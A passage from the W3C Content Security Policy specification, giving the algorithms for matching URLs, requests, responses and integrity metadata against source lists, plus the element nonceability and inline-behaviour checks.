3.  If `integrity expressions`{.variable} is empty, return
    \"`Does Not Match`\".

4.  Let `integrity sources`{.variable} be the result of [parsing
    metadata](https://www.w3.org/TR/sri-2/#parse-metadata){#ref-for-parse-metadata
    link-type="dfn"} given `integrity metadata`{.variable}.
    [\[SRI\]](#biblio-sri "Subresource Integrity"){link-type="biblio"}

5.  If `integrity sources`{.variable} is \"`no metadata`\" or an empty
    set, return \"`Does Not Match`\".

6.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate③②
    link-type="dfn"} `source`{.variable} of
    `integrity sources`{.variable}:

    1.  If `integrity expressions`{.variable} does not contain a [source
        expression](#source-expression){#ref-for-source-expression⑨
        link-type="dfn"} whose
        [hash-algorithm](#grammardef-hash-algorithm){#ref-for-grammardef-hash-algorithm①
        link-type="grammar"} is an [ASCII
        case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive⑧
        link-type="dfn"} match for `source`{.variable}'s
        [hash-algorithm](#grammardef-hash-algorithm){#ref-for-grammardef-hash-algorithm②
        link-type="grammar"}, and whose
        [base64-value](#grammardef-base64-value){#ref-for-grammardef-base64-value⑤
        link-type="grammar"} is [identical
        to](https://infra.spec.whatwg.org/#string-is){#ref-for-string-is①
        link-type="dfn"} `source`{.variable}'s `base64-value`, return
        \"`Does Not Match`\".

7.  Return \"`Matches`\".

[Note:]{.marker} Here, we verify only whether the
`integrity metadata`{.variable} is a non-empty subset of the
[hash-source](#grammardef-hash-source){#ref-for-grammardef-hash-source⑤
link-type="grammar"} sources in `source list`{.variable}. We rely on the
browser's enforcement of Subresource Integrity
[\[SRI\]](#biblio-sri "Subresource Integrity"){link-type="biblio"} to
block non-matching resources upon response.

##### [6.7.2.5. ]{.secno}[ Does `request`{.variable} match `source list`{.variable}? ]{.content}[](#match-request-to-source-list){.self-link} {#match-request-to-source-list .algorithm .heading .settled algorithm="Does request match source list?" level="6.7.2.5"}

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑥⓪
link-type="dfn"} `request`{.variable}, a [source
list](#source-lists){#ref-for-source-lists①⑤ link-type="dfn"}
`source list`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑦③
link-type="dfn"} `policy`{.variable}, this algorithm returns the result
of executing [§ 6.7.2.7 Does url match source list in origin with
redirect count?](#match-url-to-source-list) on `request`{.variable}'s
[current
url](https://fetch.spec.whatwg.org/#concept-request-current-url){#ref-for-concept-request-current-url③
link-type="dfn"}, `source list`{.variable}, `policy`{.variable}'s
[self-origin](#policy-self-origin){#ref-for-policy-self-origin③
link-type="dfn"}, and `request`{.variable}'s [redirect
count](https://fetch.spec.whatwg.org/#concept-request-redirect-count){#ref-for-concept-request-redirect-count
link-type="dfn"}.

[Note:]{.marker} This is generally used in
[directives](#directives){#ref-for-directives③⑥ link-type="dfn"}\'
[pre-request
check](#directive-pre-request-check){#ref-for-directive-pre-request-check①⑨
link-type="dfn"} algorithms to verify that a given
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑥①
link-type="dfn"} is reasonable.

##### [6.7.2.6. ]{.secno}[ Does `response`{.variable} to `request`{.variable} match `source list`{.variable}? ]{.content}[](#match-response-to-source-list){.self-link} {#match-response-to-source-list .algorithm .heading .settled algorithm="Does response to request match source list?" level="6.7.2.6"}

Given a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response②⑧
link-type="dfn"} `response`{.variable}, a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request⑥②
link-type="dfn"} `request`{.variable}, a [source
list](#source-lists){#ref-for-source-lists①⑥ link-type="dfn"}
`source list`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑦④
link-type="dfn"} `policy`{.variable}, this algorithm returns the result
of executing [§ 6.7.2.7 Does url match source list in origin with
redirect count?](#match-url-to-source-list) on `response`{.variable}'s
[url](https://fetch.spec.whatwg.org/#concept-response-url){#ref-for-concept-response-url③
link-type="dfn"}, `source list`{.variable}, `policy`{.variable}'s
[self-origin](#policy-self-origin){#ref-for-policy-self-origin④
link-type="dfn"}, and `request`{.variable}'s [redirect
count](https://fetch.spec.whatwg.org/#concept-request-redirect-count){#ref-for-concept-request-redirect-count①
link-type="dfn"}.

[Note:]{.marker} This is generally used in
[directives](#directives){#ref-for-directives③⑦ link-type="dfn"}\'
[post-request
check](#directive-post-request-check){#ref-for-directive-post-request-check②⓪
link-type="dfn"} algorithms to verify that a given
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response②⑨
link-type="dfn"} is reasonable.

##### [6.7.2.7. ]{.secno}[ Does `url`{.variable} match `source list`{.variable} in `origin`{.variable} with `redirect count`{.variable}? ]{.content}[](#match-url-to-source-list){.self-link} {#match-url-to-source-list .algorithm .heading .settled algorithm="Does url match source list in origin with redirect count?" level="6.7.2.7"}

Given a [`URL`{.idl}](https://url.spec.whatwg.org/#url){#ref-for-url⑨
link-type="idl"} `url`{.variable}, a [source
list](#source-lists){#ref-for-source-lists①⑦ link-type="dfn"}
`source list`{.variable}, an
[origin](https://html.spec.whatwg.org/#concept-origin){#ref-for-concept-origin①
link-type="dfn"} `origin`{.variable}, and a number
`redirect count`{.variable}, this algorithm returns \"`Matches`\" if the
URL matches one or more source expressions in `source list`{.variable},
or \"`Does Not Match`\" otherwise:

1.  Assert: `source list`{.variable} is not null.

2.  If `source list`{.variable} [is
    empty](https://infra.spec.whatwg.org/#list-is-empty){#ref-for-list-is-empty①
    link-type="dfn"}, return \"`Does Not Match`\".

3.  If `source list`{.variable}'s
    [size](https://infra.spec.whatwg.org/#list-size){#ref-for-list-size①
    link-type="dfn"} is 1, and `source list`{.variable}\[0\] is an
    [ASCII
    case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive⑨
    link-type="dfn"} match for the string \"`'none'`\", return
    \"`Does Not Match`\".

    [Note:]{.marker} An empty source list (that is, a directive without
    a value: `script-src`, as opposed to `script-src host1`) is
    equivalent to a source list containing `'none'`, and will not match
    any URL.

    [Note:]{.marker} The `'none'` keyword has no effect when other
    source expressions are present. That is, the list « `'none'` » does
    not match any URL. A list consisting of « `'none'`,
    `https://example.com` », on the other hand, would match
    `https://example.com/`.

4.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate③③
    link-type="dfn"} `expression`{.variable} of
    `source list`{.variable}:

    1.  If [§ 6.7.2.8 Does url match expression in origin with redirect
        count?](#match-url-to-source-expression){#ref-for-match-url-to-source-expression①}
        returns \"`Matches`\" when executed upon `url`{.variable},
        `expression`{.variable}, `origin`{.variable}, and
        `redirect count`{.variable}, return \"`Matches`\".

5.  Return \"`Does Not Match`\".

##### [6.7.2.8. ]{.secno}[ Does `url`{.variable} match `expression`{.variable} in `origin`{.variable} with `redirect count`{.variable}? ]{.content}[](#match-url-to-source-expression){#ref-for-match-url-to-source-expression② .self-link} {#match-url-to-source-expression .algorithm .dfn-paneled .heading .settled algorithm="Does url match expression in origin with redirect count?" dfn-type="dfn" export="" level="6.7.2.8" lt="Does url match expression in origin with redirect count?"}

Given a [`URL`{.idl}](https://url.spec.whatwg.org/#url){#ref-for-url①⓪
link-type="idl"} `url`{.variable}, a [source
expression](#source-expression){#ref-for-source-expression①⓪
link-type="dfn"} `expression`{.variable}, an
[origin](https://html.spec.whatwg.org/#concept-origin){#ref-for-concept-origin②
link-type="dfn"} `origin`{.variable}, and a number
`redirect count`{.variable}, this algorithm returns \"`Matches`\" if
`url`{.variable} matches `expression`{.variable}, and
\"`Does Not Match`\" otherwise.

[Note:]{.marker} `origin`{.variable} is the
[origin](https://html.spec.whatwg.org/#concept-origin){#ref-for-concept-origin③
link-type="dfn"} of the resource relative to which the
`expression`{.variable} should be resolved. \"`'self'`\", for instance,
will have distinct meaning depending on that bit of context.

1.  If `expression`{.variable} is the string \"\*\", return
    \"`Matches`\" if one or more of the following conditions is met:

    1.  `url`{.variable}'s
        [scheme](https://url.spec.whatwg.org/#concept-url-scheme){#ref-for-concept-url-scheme③
        link-type="dfn"} is an [HTTP(S)
        scheme](https://fetch.spec.whatwg.org/#http-scheme){#ref-for-http-scheme③
        link-type="dfn"}.

    2.  `url`{.variable}'s
        [scheme](https://url.spec.whatwg.org/#concept-url-scheme){#ref-for-concept-url-scheme④
        link-type="dfn"} is the same as `origin`{.variable}'s
        [scheme](https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-scheme){#ref-for-concept-origin-scheme
        link-type="dfn"}.

    [Note:]{.marker} This logic means that in order to allow a resource
    from a non-[HTTP(S)
    scheme](https://fetch.spec.whatwg.org/#http-scheme){#ref-for-http-scheme④
    link-type="dfn"}, it has to be either explicitly specified (e.g.
    `default-src * data: custom-scheme-1: custom-scheme-2:`), or the
    protected resource must be loaded from the same scheme.

2.  If `expression`{.variable} matches the
    [`scheme-source`](#grammardef-scheme-source){#ref-for-grammardef-scheme-source②
    link-type="grammar"} or
    [`host-source`](#grammardef-host-source){#ref-for-grammardef-host-source②
    link-type="grammar"} grammar:

    1.  If `expression`{.variable} has a
        [`scheme-part`](#grammardef-scheme-part){#ref-for-grammardef-scheme-part②
        link-type="grammar"}, and it does not [`scheme-part`
        match](#scheme-part-match){#ref-for-scheme-part-match
        link-type="dfn"} `url`{.variable}'s
        [scheme](https://url.spec.whatwg.org/#concept-url-scheme){#ref-for-concept-url-scheme⑤
        link-type="dfn"}, return \"`Does Not Match`\".

    2.  If `expression`{.variable} matches the
        [`scheme-source`](#grammardef-scheme-source){#ref-for-grammardef-scheme-source③
        link-type="grammar"} grammar, return \"`Matches`\".

3.  If `expression`{.variable} matches the
    [`host-source`](#grammardef-host-source){#ref-for-grammardef-host-source③
    link-type="grammar"} grammar:

    1.  If `url`{.variable}'s
        [`host`{.idl}](https://url.spec.whatwg.org/#dom-url-host){#ref-for-dom-url-host
        link-type="idl"} is null, return \"`Does Not Match`\".

    2.  If `expression`{.variable} does not have a
        [`scheme-part`](#grammardef-scheme-part){#ref-for-grammardef-scheme-part③
        link-type="grammar"}, and `origin`{.variable}'s
        [scheme](https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-scheme){#ref-for-concept-origin-scheme①
        link-type="dfn"} does not [`scheme-part`
        match](#scheme-part-match){#ref-for-scheme-part-match①
        link-type="dfn"} `url`{.variable}'s
        [scheme](https://url.spec.whatwg.org/#concept-url-scheme){#ref-for-concept-url-scheme⑥
        link-type="dfn"}, return \"`Does Not Match`\".

        [Note:]{.marker} As with
        [`scheme-part`](#grammardef-scheme-part){#ref-for-grammardef-scheme-part④
        link-type="grammar"} above, we allow schemeless
        [`host-source`](#grammardef-host-source){#ref-for-grammardef-host-source④
        link-type="grammar"} expressions to be upgraded from insecure
        schemes to secure schemes.

    3.  If `expression`{.variable}'s
        [`host-part`](#grammardef-host-part){#ref-for-grammardef-host-part①
        link-type="grammar"} does not [`host-part`
        match](#host-part-match){#ref-for-host-part-match
        link-type="dfn"} `url`{.variable}'s
        [`host`{.idl}](https://url.spec.whatwg.org/#dom-url-host){#ref-for-dom-url-host①
        link-type="idl"}, return \"`Does Not Match`\".

    4.  Let `port-part`{.variable} be `expression`{.variable}'s
        [`port-part`](#grammardef-port-part){#ref-for-grammardef-port-part①
        link-type="grammar"} if present, and null otherwise.

    5.  If `port-part`{.variable} does not [`port-part`
        match](#port-part-matches){#ref-for-port-part-matches
        link-type="dfn"} `url`{.variable}, return \"`Does Not Match`\".

    6.  If `expression`{.variable} contains a non-empty
        [`path-part`](#grammardef-path-part){#ref-for-grammardef-path-part①
        link-type="grammar"}, and `redirect count`{.variable} is 0,
        then:

        1.  Let `path`{.variable} be the result of running the [URL path
            serializer](https://url.spec.whatwg.org/#url-path-serializer){#ref-for-url-path-serializer
            link-type="dfn"} on `url`{.variable}.

        2.  If `expression`{.variable}'s
            [`path-part`](#grammardef-path-part){#ref-for-grammardef-path-part②
            link-type="grammar"} does not [`path-part`
            match](#path-part-match){#ref-for-path-part-match
            link-type="dfn"} `path`{.variable}, return
            \"`Does Not Match`\".

    7.  Return \"`Matches`\".

4.  If `expression`{.variable} is an [ASCII
    case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive①⓪
    link-type="dfn"} match for \"`'self'`\", return \"`Matches`\" if one
    or more of the following conditions is met:

    1.  `origin`{.variable} is the same as `url`{.variable}'s
        [origin](https://url.spec.whatwg.org/#concept-url-origin){#ref-for-concept-url-origin①
        link-type="dfn"}

    2.  `origin`{.variable}'s
        [`host`{.idl}](https://url.spec.whatwg.org/#dom-url-host){#ref-for-dom-url-host②
        link-type="idl"} is the same as `url`{.variable}'s
        [`host`{.idl}](https://url.spec.whatwg.org/#dom-url-host){#ref-for-dom-url-host③
        link-type="idl"}, `origin`{.variable}'s
        [`port`{.idl}](https://url.spec.whatwg.org/#dom-url-port){#ref-for-dom-url-port
        link-type="idl"} and `url`{.variable}'s
        [`port`{.idl}](https://url.spec.whatwg.org/#dom-url-port){#ref-for-dom-url-port①
        link-type="idl"} are either the same or the [default
        ports](https://url.spec.whatwg.org/#default-port){#ref-for-default-port
        link-type="dfn"} for their respective
        [scheme](https://url.spec.whatwg.org/#concept-url-scheme){#ref-for-concept-url-scheme⑦
        link-type="dfn"}s, and one or more of the following conditions
        is met:

        1.  `url`{.variable}'s
            [scheme](https://url.spec.whatwg.org/#concept-url-scheme){#ref-for-concept-url-scheme⑧
            link-type="dfn"} is \"`https`\" or \"`wss`\"

        2.  `origin`{.variable}'s
            [scheme](https://url.spec.whatwg.org/#concept-url-scheme){#ref-for-concept-url-scheme⑨
            link-type="dfn"} is \"`http`\" and `url`{.variable}'s
            [scheme](https://url.spec.whatwg.org/#concept-url-scheme){#ref-for-concept-url-scheme①⓪
            link-type="dfn"} is \"`http`\" or \"`ws`\"

    [Note:]{.marker} Like the
    [`scheme-part`](#grammardef-scheme-part){#ref-for-grammardef-scheme-part⑤
    link-type="grammar"} logic above, the \"`'self'`\" matching
    algorithm allows upgrades to secure schemes when it is safe to do
    so. We limit these upgrades to endpoints running on the default port
    for a particular scheme or a port that matches the origin of the
    protected resource, as this seems sufficient to deal with upgrades
    that can be reasonably expected to succeed.

5.  Return \"`Does Not Match`\".

##### [6.7.2.9. ]{.secno}[ `scheme-part` matching ]{.content}[](#match-schemes){.self-link} {#match-schemes .algorithm .heading .settled algorithm="scheme-part matching" level="6.7.2.9"}

An [ASCII
string](https://infra.spec.whatwg.org/#ascii-string){#ref-for-ascii-string⑤
link-type="dfn"} [`scheme-part` matches]{#scheme-part-match .dfn
.dfn-paneled dfn-type="dfn" export="" lt="scheme-part match"} another
[ASCII
string](https://infra.spec.whatwg.org/#ascii-string){#ref-for-ascii-string⑥
link-type="dfn"} if a CSP source expression that contained the first as
a
[`scheme-part`](#grammardef-scheme-part){#ref-for-grammardef-scheme-part⑥
link-type="grammar"} could potentially match a URL containing the latter
as a
[scheme](https://url.spec.whatwg.org/#concept-url-scheme){#ref-for-concept-url-scheme①①
link-type="dfn"}. For example, we say that \"http\" [`scheme-part`
matches](#scheme-part-match){#ref-for-scheme-part-match②
link-type="dfn"} \"https\".

[Note:]{.marker} The matching relation is asymmetric. For example, the
source expressions `https:` and `https://example.com/` do not match the
URL `http://example.com/`. We always allow a secure upgrade from an
explicitly insecure expression. `script-src http:` is treated as
equivalent to `script-src http: https:`, `script-src http://example.com`
to `script-src http://example.com https://example.com`, and
`connect-src ws:` to `connect-src ws: wss:`.

More formally, two [ASCII
strings](https://infra.spec.whatwg.org/#ascii-string){#ref-for-ascii-string⑦
link-type="dfn"} `A`{.variable} and `B`{.variable} are said to
[`scheme-part` match](#scheme-part-match){#ref-for-scheme-part-match③
link-type="dfn"} if the following algorithm returns \"`Matches`\":

1.  If one of the following is true, return \"`Matches`\":

    1.  `A`{.variable} is an [ASCII
        case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive①①
        link-type="dfn"} match for `B`{.variable}.

    2.  `A`{.variable} is an [ASCII
        case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive①②
        link-type="dfn"} match for \"`http`\", and `B`{.variable} is an
        [ASCII
        case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive①③
        link-type="dfn"} match for \"`https`\".

    3.  `A`{.variable} is an [ASCII
        case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive①④
        link-type="dfn"} match for \"`ws`\", and `B`{.variable} is an
        [ASCII
        case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive①⑤
        link-type="dfn"} match for \"`wss`\", \"`http`\", or
        \"`https`\".

    4.  `A`{.variable} is an [ASCII
        case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive①⑥
        link-type="dfn"} match for \"`wss`\", and `B`{.variable} is an
        [ASCII
        case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive①⑦
        link-type="dfn"} match for \"`https`\".

2.  Return \"`Does Not Match`\".

##### [6.7.2.10. ]{.secno}[ `host-part` matching ]{.content}[](#match-hosts){.self-link} {#match-hosts .algorithm .heading .settled algorithm="host-part matching" level="6.7.2.10"}

An [ASCII
string](https://infra.spec.whatwg.org/#ascii-string){#ref-for-ascii-string⑧
link-type="dfn"} [`host-part` matches]{#host-part-match .dfn
.dfn-paneled dfn-type="dfn" export="" lt="host-part match"} a
[host](https://url.spec.whatwg.org/#concept-host){#ref-for-concept-host
link-type="dfn"} if a CSP source expression that contained the first as
a [`host-part`](#grammardef-host-part){#ref-for-grammardef-host-part②
link-type="grammar"} could potentially match the latter. For example, we
say that \"www.example.com\" [host-part
matches](#host-part-match){#ref-for-host-part-match① link-type="dfn"}
\"www.example.com\".

More formally, [ASCII
string](https://infra.spec.whatwg.org/#ascii-string){#ref-for-ascii-string⑨
link-type="dfn"} `pattern`{.variable} and
[host](https://url.spec.whatwg.org/#concept-host){#ref-for-concept-host①
link-type="dfn"} `host`{.variable} are said to [`host-part`
match](#host-part-match){#ref-for-host-part-match② link-type="dfn"} if
the following algorithm returns \"`Matches`\":

[Note:]{.marker} The matching relation is asymmetric. That is,
`pattern`{.variable} matching `host`{.variable} does not mean that
`host`{.variable} will match `pattern`{.variable}. For example,
`*.example.com` [`host-part`
matches](#host-part-match){#ref-for-host-part-match③ link-type="dfn"}
`www.example.com`, but `www.example.com` does not [`host-part`
match](#host-part-match){#ref-for-host-part-match④ link-type="dfn"}
`*.example.com`.

[Note:]{.marker} A future version of this specification may allow
literal IPv6 and IPv4 addresses, depending on usage and demand. Given
the weak security properties of IP addresses in relation to named hosts,
however, authors are encouraged to prefer the latter whenever possible.

1.  If `host`{.variable} is not a
    [domain](https://url.spec.whatwg.org/#concept-domain){#ref-for-concept-domain
    link-type="dfn"}, return \"`Does Not Match`\".

2.  If `pattern`{.variable} is \"`*`\", return \"`Matches`\".

3.  If `pattern`{.variable} [starts
    with](https://infra.spec.whatwg.org/#string-starts-with){#ref-for-string-starts-with
    link-type="dfn"} \"`*.`\":

    1.  Let `remaining`{.variable} be `pattern`{.variable} with the
        leading U+002A (`*`) removed and [ASCII
        lowercased](https://infra.spec.whatwg.org/#ascii-lowercase){#ref-for-ascii-lowercase①
        link-type="dfn"}.

    2.  If `host`{.variable} to [ASCII
        lowercase](https://infra.spec.whatwg.org/#ascii-lowercase){#ref-for-ascii-lowercase②
        link-type="dfn"} [ends
        with](https://infra.spec.whatwg.org/#string-ends-with){#ref-for-string-ends-with
        link-type="dfn"} `remaining`{.variable}, then return
        \"`Matches`\".

    3.  Return \"`Does Not Match`\".

4.  If `pattern`{.variable} is not an [ASCII
    case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive①⑧
    link-type="dfn"} match for `host`{.variable}, return
    \"`Does Not Match`\".

5.  Return \"`Matches`\".

##### [6.7.2.11. ]{.secno}[ `port-part` matching ]{.content}[](#match-ports){.self-link} {#match-ports .algorithm .heading .settled algorithm="port-part matching" level="6.7.2.11"}

An [ASCII
string](https://infra.spec.whatwg.org/#ascii-string){#ref-for-ascii-string①⓪
link-type="dfn"} or null `input`{.variable} [`port-part`
matches]{#port-part-matches .dfn .dfn-paneled dfn-type="dfn" export=""}
[URL](https://url.spec.whatwg.org/#concept-url){#ref-for-concept-url③
link-type="dfn"} `url`{.variable} if a CSP source expression that
contained the first as a
[`port-part`](#grammardef-port-part){#ref-for-grammardef-port-part②
link-type="grammar"} could potentially match a URL containing the
latter's
[port](https://url.spec.whatwg.org/#concept-url-port){#ref-for-concept-url-port
link-type="dfn"} and
[scheme](https://url.spec.whatwg.org/#concept-url-scheme){#ref-for-concept-url-scheme①②
link-type="dfn"}. For example, \"80\" [`port-part`
matches](#port-part-matches){#ref-for-port-part-matches①
link-type="dfn"} matches http://example.com.

1.  Assert: `input`{.variable} is null, \"\*\", or a sequence of one or
    more [ASCII
    digits](https://infra.spec.whatwg.org/#ascii-digit){#ref-for-ascii-digit
    link-type="dfn"}.

2.  If `input`{.variable} is equal to \"\*\", return \"`Matches`\".

3.  Let `normalizedInput`{.variable} be null if `input`{.variable} null;
    otherwise `input`{.variable} interpreted as decimal number.

4.  If `normalizedInput`{.variable} equals `url`{.variable}'s
    [port](https://url.spec.whatwg.org/#concept-url-port){#ref-for-concept-url-port①
    link-type="dfn"}, return \"`Matches`\".

5.  If `url`{.variable}'s
    [port](https://url.spec.whatwg.org/#concept-url-port){#ref-for-concept-url-port②
    link-type="dfn"} is null:

    1.  Let `defaultPort`{.variable} be the [default
        port](https://url.spec.whatwg.org/#default-port){#ref-for-default-port①
        link-type="dfn"} for `url`{.variable}'s
        [scheme](https://url.spec.whatwg.org/#concept-url-scheme){#ref-for-concept-url-scheme①③
        link-type="dfn"}.

    2.  If `normalizedInput`{.variable} equals `defaultPort`{.variable},
        return \"`Matches`\".

6.  Return \"`Does Not Match`\".

##### [6.7.2.12. ]{.secno}[ `path-part` matching ]{.content}[](#match-paths){.self-link} {#match-paths .algorithm .heading .settled algorithm="path-part matching" level="6.7.2.12"}

An [ASCII
string](https://infra.spec.whatwg.org/#ascii-string){#ref-for-ascii-string①①
link-type="dfn"} `path A`{.variable} [`path-part`
matches]{#path-part-match .dfn .dfn-paneled dfn-type="dfn" export=""
lt="path-part match"} another [ASCII
string](https://infra.spec.whatwg.org/#ascii-string){#ref-for-ascii-string①②
link-type="dfn"} `path B`{.variable} if a CSP source expression that
contained the first as a
[`path-part`](#grammardef-path-part){#ref-for-grammardef-path-part③
link-type="grammar"} could potentially match a URL containing the latter
as a
[path](https://url.spec.whatwg.org/#concept-url-path){#ref-for-concept-url-path
link-type="dfn"}. For example, we say that \"/subdirectory/\"
[`path-part` matches](#path-part-match){#ref-for-path-part-match①
link-type="dfn"} \"/subdirectory/file\".

[Note:]{.marker} The matching relation is asymmetric. That is,
`path A`{.variable} matching `path B`{.variable} does not mean that
`path B`{.variable} will match `path A`{.variable}.

1.  If `path A`{.variable} is the empty string, return \"`Matches`\".

2.  If `path A`{.variable} consists of one character that is equal to
    the U+002F SOLIDUS character (`/`) and `path B`{.variable} is the
    empty string, return \"`Matches`\".

3.  Let `exact match`{.variable} be `false` if the final character of
    `path A`{.variable} is the U+002F SOLIDUS character (`/`), and
    `true` otherwise.

4.  Let `path list A`{.variable} and `path list B`{.variable} be the
    result of [strictly
    splitting](https://infra.spec.whatwg.org/#strictly-split){#ref-for-strictly-split①
    link-type="dfn"} `path A`{.variable} and `path B`{.variable}
    respectively on the U+002F SOLIDUS character (`/`).

5.  If `path list A`{.variable} has more items than
    `path list B`{.variable}, return \"`Does Not Match`\".

6.  If `exact match`{.variable} is `true`, and `path list A`{.variable}
    does not have the same number of items as `path list B`{.variable},
    return \"`Does Not Match`\".

7.  If `exact match`{.variable} is `false`:

    1.  Assert: the final item in `path list A`{.variable} is the empty
        string.

    2.  Remove the final item from `path list A`{.variable}.

8.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate③④
    link-type="dfn"} `piece A`{.variable} of `path list A`{.variable}:

    1.  Let `piece B`{.variable} be the next item in
        `path list B`{.variable}.

    2.  Let `decoded piece A`{.variable} be the
        [percent-decoding](https://url.spec.whatwg.org/#string-percent-decode){#ref-for-string-percent-decode
        link-type="dfn"} of `piece A`{.variable}.

    3.  Let `decoded piece B`{.variable} be the
        [percent-decoding](https://url.spec.whatwg.org/#string-percent-decode){#ref-for-string-percent-decode①
        link-type="dfn"} of `piece B`{.variable}.

    4.  If `decoded piece A`{.variable} is not
        `decoded piece B`{.variable}, return \"`Does Not Match`\".

9.  Return \"`Matches`\".

#### [6.7.3. ]{.secno}[Element Matching Algorithms]{.content}[](#matching-elements){.self-link} {#matching-elements .heading .settled level="6.7.3"}

##### [6.7.3.1. ]{.secno}[ Is `element`{.variable} nonceable? ]{.content}[](#is-element-nonceable){.self-link} {#is-element-nonceable .algorithm .heading .settled algorithm="Is element nonceable?" level="6.7.3.1"}

Given an
[`Element`{.idl}](https://dom.spec.whatwg.org/#element){#ref-for-element⑨
link-type="idl"} `element`{.variable}, this algorithm returns
\"`Nonceable`\" if a
[`nonce-source`](#grammardef-nonce-source){#ref-for-grammardef-nonce-source⑤
link-type="grammar"} expression can match the element (as discussed in
[§ 7.2 Nonce Hijacking](#security-nonce-hijacking)), and
\"`Not Nonceable`\" if such expressions should not be applied.

1.  If `element`{.variable} does not have an attribute named
    \"`nonce`\", return \"`Not Nonceable`\".

2.  If `element`{.variable} is a
    [`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script⑥
    link-type="element"} element, then [for
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate③⑤
    link-type="dfn"} `attribute`{.variable} of `element`{.variable}'s
    [attribute
    list](https://dom.spec.whatwg.org/#concept-element-attribute){#ref-for-concept-element-attribute
    link-type="dfn"}:

    1.  If `attribute`{.variable}'s name contains an [ASCII
        case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive①⑨
        link-type="dfn"} match for \"`<script`\" or \"`<style`\", return
        \"`Not Nonceable`\".

    2.  If `attribute`{.variable}'s value contains an [ASCII
        case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive){#ref-for-ascii-case-insensitive②⓪
        link-type="dfn"} match for \"`<script`\" or \"`<style`\", return
        \"`Not Nonceable`\".

3.  If `element`{.variable} had a
    [duplicate-attribute](https://html.spec.whatwg.org/multipage/parsing.html#parse-error-duplicate-attribute){#ref-for-parse-error-duplicate-attribute
    link-type="dfn"} [parse
    error](https://html.spec.whatwg.org/multipage/images.html#concept-microsyntax-parse-error){#ref-for-concept-microsyntax-parse-error
    link-type="dfn"} during tokenization, return \"`Not Nonceable`\".

    [](#issue-820579ab){.self-link} We need some sort of hook in HTML to
    record this error if we're planning on using it here. [\[whatwg/html
    Issue #3257\]](https://github.com/whatwg/html/issues/3257)

4.  Return \"`Nonceable`\".

[](#issue-4592ac7e){.self-link} This processing is meant to mitigate the
risk of dangling markup attacks that steal the nonce from an existing
element in order to load injected script. It is fairly expensive,
however, as it requires that we walk through all attributes and their
values in order to determine whether the script should execute. Here, we
try to minimize the impact by doing this check only for
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script⑦
link-type="element"} elements when a nonce is present, but we should
probably consider this algorithm as \"at risk\" until we know its
impact. [\[w3c/webappsec-csp Issue
#98\]](https://github.com/w3c/webappsec-csp/issues/98)

##### [6.7.3.2. ]{.secno}[ Does a source list allow all inline behavior for `type`{.variable}? ]{.content}[](#allow-all-inline){.self-link} {#allow-all-inline .algorithm .heading .settled algorithm="Does a source list allow all inline behavior for type?" level="6.7.3.2"}

A [source list](#source-lists){#ref-for-source-lists①⑧ link-type="dfn"}
[allows all inline behavior]{#source-list-allows-all-inline-behavior
.dfn .dfn-paneled dfn-for="source list" dfn-type="dfn" export=""
local-lt="allow all inline behavior"} of a given `type`{.variable} if it
contains the
[`keyword-source`](#grammardef-keyword-source){#ref-for-grammardef-keyword-source③
link-type="grammar"} expression
[`'unsafe-inline'`](#grammardef-unsafe-inline){#ref-for-grammardef-unsafe-inline①
link-type="grammar"}, and does not override that expression as described
in the following algorithm:

Given a [source list](#source-lists){#ref-for-source-lists①⑨
link-type="dfn"} `list`{.variable} and a string `type`{.variable}, the
following algorithm returns \"`Allows`\" if all inline content of a
given `type`{.variable} is allowed and \"`Does Not Allow`\" otherwise.

1.  Let `allow all inline`{.variable} be `false`.

2.  [For
    each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate③⑥
    link-type="dfn"} `expression`{.variable} of `list`{.variable}:

    1.  If `expression`{.variable} matches the
        [`nonce-source`](#grammardef-nonce-source){#ref-for-grammardef-nonce-source⑥
        link-type="grammar"} or
        [`hash-source`](#grammardef-hash-source){#ref-for-grammardef-hash-source⑥
        link-type="grammar"} grammar, return \"`Does Not Allow`\".

    2.  If `type`{.variable} is \"`script`\", \"`script attribute`\" or
        \"`navigation`\" and `expression`{.variable} matches the
        [keyword-source](#grammardef-keyword-source){#ref-for-grammardef-keyword-source④
        link-type="grammar"}
        \"[`'strict-dynamic'`](#grammardef-strict-dynamic){#ref-for-grammardef-strict-dynamic④
        link-type="grammar"}\", return \"`Does Not Allow`\".

        [Note:]{.marker} `'strict-dynamic'` only applies to scripts, not
        other resource types. Usage is explained in more detail in
